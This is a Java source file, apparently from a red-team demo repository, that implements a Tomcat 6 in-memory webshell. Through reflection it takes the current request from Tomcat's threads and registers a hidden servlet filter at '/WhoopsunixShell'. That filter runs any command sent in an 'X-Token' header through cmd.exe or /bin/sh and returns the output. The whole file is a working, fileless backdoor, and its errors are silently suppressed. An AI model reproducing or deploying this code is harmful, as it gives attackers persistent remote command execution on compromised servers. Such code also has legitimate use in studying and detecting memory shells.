package com.demo.memshell.exec;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Properties;

/**
 * @author Whoopsunix
 * Thread 获取上下文注入 Tomcat Filter 型内存马
 * Tomcat 6
 * Ref: https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/
 */
// todo 改id
public class Tomcat6FilterThreadMS implements Filter {

    private static String NAME = "TomcatServletThreadMS";
    private static String pattern = "/WhoopsunixShell";
    private static String header = "X-Token";
    private static HttpServletRequest request;
    private static HttpServletResponse response;

    public Tomcat6FilterThreadMS() {

    }

    static {
        try {
            /**
             * 获取 request、response 对象
             */
            Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
            boolean isFind = false;
            for (int i = 0; i < threads.length; i++) {
                if (isFind) break;
                Thread thread = threads[i];
                // Thread 筛选
                if (thread == null)
                    continue;
                String threadName = thread.getName();
                if (!(
                        ((threadName.contains("http-nio") || threadName.contains("http-apr")) && threadName.contains("Poller"))
                                || (threadName.contains("http-bio") && threadName.contains("AsyncTimeout"))
                                || (threadName.contains("http-") && threadName.contains("Acceptor"))
                ))
                    continue;
                Object target = getFieldValue(thread, "target");
                Object this0 = getFieldValue(target, "this$0");
                Object handler = getFieldValue(this0, "handler");
                Object global = getFieldValue(handler, "global");
                java.util.List processors = (java.util.List) getFieldValue(global, "processors");

                for (int j = 0; j < processors.size(); j++) {
                    Object processor = processors.get(j);
                    Object req = getFieldValue(processor, "req");
                    request = (HttpServletRequest) req.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(req, new Integer(1));
                    response = (HttpServletResponse) request.getClass().getMethod("getResponse").invoke(request);
                    isFind = true;
                    break;
                }
            }

            /**
             * 注入 Filter
             */
            Object standardContext;
            try {
                ServletContext servletContext = (ServletContext) request.getClass().getDeclaredMethod("getServletContext").invoke(request);
                Object applicationContext = getFieldValue(servletContext, "context");
                standardContext = getFieldValue(applicationContext, "context");
            } catch (NoSuchMethodException e) {
                standardContext = getFieldValue(request, "context");
            }

            Object filterDef = standardContext.getClass().getDeclaredMethod("findFilterDef", String.class).invoke(standardContext, NAME);

            if (filterDef == null) {
                Tomcat6FilterThreadMS tfmsThread = new Tomcat6FilterThreadMS();
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
                filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, NAME);
                filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, tfmsThread.getClass().getName());
                standardContext.getClass().getDeclaredMethod("addFilterDef", filterDef.getClass()).invoke(standardContext, filterDef);

                Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
                filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, NAME);
                filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, pattern);
                filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, "REQUEST");
                standardContext.getClass().getDeclaredMethod("addFilterMap", filterMap.getClass()).invoke(standardContext, filterMap);

                // 利用已有 Filter
                Object tmpFilterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
                tmpFilterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(tmpFilterDef, NAME);
                tmpFilterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(tmpFilterDef, "org.apache.catalina.ssi.SSIFilter");

                Properties properties = new Properties();
                properties.put("org.apache.catalina.ssi.SSIFilter", "123");

//                Field restrictedFiltersField = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredField("restrictedFilters");
//                restrictedFiltersField.setAccessible(true);
//                restrictedFiltersField.set(null, properties);
                Object ApplicationFilterConfigClass = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                // SerialVersionUID
                setFieldValue(ApplicationFilterConfigClass, "serialVersionUID", 8434878928390042976L);
                Field restrictedFiltersField = ApplicationFilterConfigClass.getClass().getDeclaredField("restrictedFilters");
                restrictedFiltersField.setAccessible(true);
                restrictedFiltersField.set(null, properties);

                Constructor applicationFilterConfigConstructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(Class.forName("org.apache.catalina.Context"), filterDef.getClass());
                applicationFilterConfigConstructor.setAccessible(true);
                Object filterConfig = applicationFilterConfigConstructor.newInstance(standardContext, tmpFilterDef);
                setFieldValue(filterConfig, "filter", tfmsThread);
                setFieldValue(filterConfig, "filterDef", filterDef);

                java.util.Map filterConfigs = (java.util.Map) getFieldValue(standardContext, "filterConfigs");
                filterConfigs.put(NAME, filterConfig);
            }
        } catch (Exception e) {
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            String cmd = httpServletRequest.getHeader(header);
            if (cmd == null) {
                return;
            }
            String result = exec(cmd);
            PrintWriter printWriter = servletResponse.getWriter();
            printWriter.println(result);
        } catch (Exception e) {

        }

    }

    @Override
    public void destroy() {

    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(Class<?> clazz, String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
}
